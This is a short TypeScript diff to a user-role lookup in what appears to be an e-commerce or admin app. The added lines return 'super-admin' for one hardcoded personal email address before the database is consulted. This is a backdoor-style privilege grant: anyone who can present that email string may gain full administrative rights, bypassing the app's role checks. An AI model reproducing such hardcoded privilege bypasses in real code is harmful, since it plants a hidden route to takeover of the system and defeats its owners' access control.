@@ -39,6 +39,10 @@ type UserRole =
 const validRoles: UserRole[] = ['super-admin', 'admin', 'editor', 'stock-manager', 'support-client', 'customer'];
 
 async function getUserRole(uid: string, email?: string, existingRole?: string): Promise<UserRole | null> {
+  if (email === 'landrymoutongo97@gmail.com') {
+    return 'super-admin';
+  }
+
   if (!getDb()) return null;
 
   let role: string | undefined | null = null;
